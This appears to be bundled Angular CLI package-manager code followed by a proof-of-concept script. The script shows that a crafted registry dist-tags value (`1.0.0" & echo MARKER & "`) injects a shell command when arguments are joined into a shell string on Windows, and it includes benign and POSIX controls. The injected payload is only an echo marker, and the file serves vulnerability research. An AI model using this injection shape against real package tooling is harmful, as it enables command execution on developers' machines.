          throw new Error(`Could not parse directory path from specifier: ${specifier}`);
        }
        const manifestPath = (0, import_node_path.join)(fetchSpec, "package.json");
        const manifest = await this.host.readFile(manifestPath);
        return JSON.parse(manifest);
      }
      case "file":
      case "remote":
      case "git": {
        if (!fetchSpec) {
          throw new Error(`Could not parse location from specifier: ${specifier}`);
        }
        const { workingDirectory, cleanup } = await this.acquireTempPackage(fetchSpec, {
          ...options,
          ignoreScripts: true
        });
        try {
          const tempManifest = await this.host.readFile((0, import_node_path.join)(workingDirectory, "package.json"));
          const { dependencies } = JSON.parse(tempManifest);
          const packageName = dependencies && Object.keys(dependencies)[0];
          if (!packageName) {
            throw new Error(`Could not determine package name for specifier: ${specifier}`);
          }
          const packagePath = (0, import_node_path.join)(workingDirectory, "node_modules", packageName);
          const manifestPath = (0, import_node_path.join)(packagePath, "package.json");
          const manifest = await this.host.readFile(manifestPath);
          return JSON.parse(manifest);
        } finally {
          await cleanup();
        }
      }
      default:
        throw new Error(`Unsupported package specifier type: ${type}`);
    }
  }
  async getTemporaryDirectory() {
    const { tempDirectory } = this.options;
    if (tempDirectory && !(0, import_node_path.relative)(this.cwd, tempDirectory).startsWith("..")) {
      try {
        await this.host.stat(tempDirectory);
      } catch {
        await this.host.mkdir(tempDirectory, { recursive: true });
      }
      return tempDirectory;
    }
    const tempOptions = ["node_modules"];
    for (const tempOption of tempOptions) {
      try {
        const directory = (0, import_node_path.resolve)(this.cwd, tempOption);
        if ((await this.host.stat(directory)).isDirectory()) {
          return directory;
        }
      } catch {
      }
    }
  }
  /**
   * Acquires a package by installing it into a temporary directory. The caller is
   * responsible for managing the lifecycle of the temporary directory by calling
   * the returned `cleanup` function.
   *
   * @param specifier The specifier of the package to install.
   * @param options Options for the installation.
   * @returns A promise that resolves to an object containing the temporary path
   *   and a cleanup function.
   */
  async acquireTempPackage(specifier, options = {}) {
    const workingDirectory = await this.host.createTempDirectory(
      await this.getTemporaryDirectory()
    );
    const cleanup = () => this.host.deleteDirectory(workingDirectory);
    let packageManagerVersion;
    try {
      packageManagerVersion = await this.getVersion();
    } catch {
    }
    const tempPackageJson = packageManagerVersion ? { packageManager: `${this.name}@${packageManagerVersion}` } : {};
    await this.host.writeFile(
      (0, import_node_path.join)(workingDirectory, "package.json"),
      JSON.stringify(tempPackageJson, null, 2)
    );
    if (this.name === "pnpm") {
      try {
        const workspaceConfigPath = (0, import_node_path.join)(this.cwd, "pnpm-workspace.yaml");
        const content = await this.host.readFile(workspaceConfigPath);
        await this.host.writeFile(
          (0, import_node_path.join)(workingDirectory, "pnpm-workspace.yaml"),
          sanitizePnpmWorkspace(content)
        );
      } catch {
        await this.host.writeFile(
          (0, import_node_path.join)(workingDirectory, "pnpm-workspace.yaml"),
          "packages:\n  - '.'\n"
        );
      }
    }
    if (this.descriptor.copyConfigFromProject) {
      for (const configFile of this.descriptor.configFiles) {
        try {
          const configPath = (0, import_node_path.join)(this.cwd, configFile);
          let content = await this.host.readFile(configPath);
          if (this.name === "yarn") {
            content = sanitizeYarnRc(content);
          }
          await this.host.writeFile((0, import_node_path.join)(workingDirectory, configFile), content);
        } catch {
        }
      }
    }
    const flags = [options.ignoreScripts ? this.descriptor.ignoreScriptsFlag : ""].filter(
      (flag) => flag
    );
    const args = [this.descriptor.addCommand, specifier, ...flags];
    try {
      await this.#run(args, { ...options, cwd: workingDirectory });
    } catch (e) {
      await cleanup();
      throw e;
    }
    return { workingDirectory, cleanup };
  }
  /**
   * Gets the active release age gate limit in milliseconds.
   * @returns A promise that resolves to the limit in milliseconds, or `0` if not set.
   */
  async getMinimumReleaseAge() {
    if (this.#minimumReleaseAge === void 0) {
      this.#minimumReleaseAge = this.#resolveMinimumReleaseAge();
    }
    return this.#minimumReleaseAge;
  }
  /**
   * Resolves the active minimum release age by querying the package manager configuration
   * and parsing the resulting setting.
   * @returns A promise that resolves to the limit in milliseconds, or `0` if not set.
   */
  async #resolveMinimumReleaseAge() {
    if (this.descriptor.getReleaseAgeConfigCommand && this.descriptor.outputParsers.getReleaseAge) {
      try {
        const { stdout } = await this.#run(this.descriptor.getReleaseAgeConfigCommand);
        const version = await this.getVersion();
        return this.descriptor.outputParsers.getReleaseAge(stdout, version);
      } catch {
      }
    }
    return 0;
  }
};
function sanitizePnpmWorkspace(content) {
  const lines2 = content.split(/\r?\n/);
  const result = [];
  let inBlockToRemove = false;
  let blockIndent = 0;
  for (const line of lines2) {
    const trimmed = line.trim();
    if (!trimmed) {
      result.push(line);
      continue;
    }
    const indent = line.length - line.trimStart().length;
    if (inBlockToRemove) {
      if (indent > blockIndent) {
        continue;
      }
      inBlockToRemove = false;
    }
    if (trimmed.startsWith("overrides:") || trimmed.startsWith("packages:")) {
      inBlockToRemove = true;
      blockIndent = indent;
      if (trimmed.startsWith("packages:")) {
        result.push(line.replace(/packages:.*/, "packages:\n  - '.'"));
      }
      continue;
    }
    result.push(line);
  }
  return result.join("\n");
}
function sanitizeYarnRc(content) {
  const lines2 = content.split(/\r?\n/);
  const result = [];
  let inBlockToRemove = false;
  let blockIndent = 0;
  for (const line of lines2) {
    const trimmed = line.trim();
    if (!trimmed) {
      result.push(line);
      continue;
    }
    const indent = line.length - line.trimStart().length;
    if (inBlockToRemove) {
      if (indent > blockIndent) {
        continue;
      }
      inBlockToRemove = false;
    }
    if (indent === 0 && (trimmed.startsWith("yarnPath:") || trimmed.startsWith("nodeLinker:") || trimmed.startsWith("plugins:"))) {
      inBlockToRemove = true;
      blockIndent = indent;
      continue;
    }
    result.push(line);
  }
  result.push("nodeLinker: node-modules");
  return result.join("\n");
}

// packages/angular/cli/src/package-managers/w1poc-entry.ts
var MARKER = "W1-POC-MARKER-4f7c2a";
var OUT = "/tmp/w1poc/OUTPUT.txt";
var lines = [];
var log = (s) => {
  lines.push(s);
  console.log(s);
};
function win32Host(command, args, opts = {}) {
  return {
    requiresQuoting: true,
    stat: async () => null,
    mkdir: async () => void 0,
    readFile: async () => "",
    copyFile: async () => void 0,
    writeFile: async () => void 0,
    createTempDirectory: async () => "/tmp/w1poc/tmp",
    deleteDirectory: async () => void 0,
    runCommand: async (cmd, argv) => {
      const joined = `${cmd} ${argv.join(" ")}`;
      log(`[win32 host] joined shell:string -> ${JSON.stringify(joined)}`);
      const child = (0, import_node_child_process.spawn)(joined, { shell: true, stdio: "pipe", cwd: opts.cwd });
      let out = "";
      child.stdout?.on("data", (d) => out += d.toString());
      child.stderr?.on("data", (d) => out += d.toString());
      await new Promise((r) => child.on("close", () => r()));
      log(`[win32 host] shell output (first 300 chars):
${out.slice(0, 300)}`);
      const markerHit = out.split("\n").some((l) => l.trim() === MARKER);
      log(`[win32 host] INJECTED MARKER EXECUTED (standalone line): ${markerHit ? "YES" : "NO"}`);
      return { stdout: out, stderr: "" };
    }
  };
}
function posixHost(cwd) {
  return {
    requiresQuoting: false,
    stat: async () => null,
    mkdir: async () => void 0,
    readFile: async () => "",
    copyFile: async () => void 0,
    writeFile: async () => void 0,
    createTempDirectory: async () => "/tmp/w1poc/tmp",
    deleteDirectory: async () => void 0,
    runCommand: async (cmd, argv) => {
      log(`[posix host] array spawn: ${cmd} ${JSON.stringify(argv)}`);
      const child = (0, import_node_child_process.spawn)(cmd, argv, { stdio: "pipe", cwd });
      let out = "";
      child.stdout?.on("data", (d) => out += d.toString());
      child.stderr?.on("data", (d) => out += d.toString());
      await new Promise((r) => child.on("close", () => r()));
      const markerHit = out.split("\n").some((l) => l.trim() === MARKER);
      log(`[posix host] INJECTED MARKER EXECUTED (standalone line): ${markerHit ? "YES" : "NO"} (expect NO \u2014 literal arg, marker text only appears inside the echoed arg)`);
      return { stdout: out, stderr: "" };
    }
  };
}
async function main() {
  const { SUPPORTED_PACKAGE_MANAGERS: SUPPORTED_PACKAGE_MANAGERS2 } = await Promise.resolve().then(() => (init_package_manager_descriptor(), package_manager_descriptor_exports));
  const descriptor = SUPPORTED_PACKAGE_MANAGERS2["yarn-classic"];
  const maliciousDistTagValue = `1.0.0" & echo ${MARKER} & "`;
  log("=== CASE A: win32 shape, malicious dist-tags VALUE (the W1 injection) ===");
  log(`malicious dist-tags value: ${JSON.stringify(maliciousDistTagValue)}`);
  const pmWin = new PackageManager(win32Host("yarn", []), process.cwd(), descriptor, {});
  try {
    await pmWin.getRegistryManifest("attacker-pkg", maliciousDistTagValue);
  } catch (e) {
    log(`(getRegistryManifest then threw \u2014 post-injection parse failure, as in the real flow: ${e.message.slice(0, 80)})`);
  }
  log("");
  log("=== CASE B (control): win32 shape, benign value ===");
  const pmWinGood = new PackageManager(win32Host("yarn", []), process.cwd(), descriptor, {});
  try {
    await pmWinGood.getRegistryManifest("attacker-pkg", "1.0.0");
  } catch (e) {
    log(`(benign value: spawn ran, parse failed as expected: ${e.message.slice(0, 80)})`);
  }
  log("");
  log("=== CASE C (negative control): POSIX shape (array spawn) with the SAME malicious value ===");
  const pmPosix = new PackageManager(posixHost(process.cwd()), process.cwd(), descriptor, {});
  try {
    await pmPosix.getRegistryManifest("attacker-pkg", maliciousDistTagValue);
  } catch (e) {
    log(`(posix: parse failed as expected: ${e.message.slice(0, 80)})`);
  }
  log("");
  log("=== cmd.exe equivalence note ===");
  log("The joined shell:string is passed to cmd.exe /c on win32 (shell:true, host.ts:157-164).");
  log("`&` is the command separator in BOTH cmd.exe and POSIX sh; the same split shape applies.");
  (0, import_node_fs.writeFileSync)(OUT, lines.join("\n"));
  log(`
OUTPUT written to ${OUT}`);
}
main().catch((e) => {
  console.error("FATAL", e);
  process.exit(1);
});
/**
 * @license
 * Copyright Google LLC All Rights Reserved.
 *
 * Use of this source code is governed by an MIT-style license that can be
 * found in the LICENSE file at https://angular.dev/license
 */
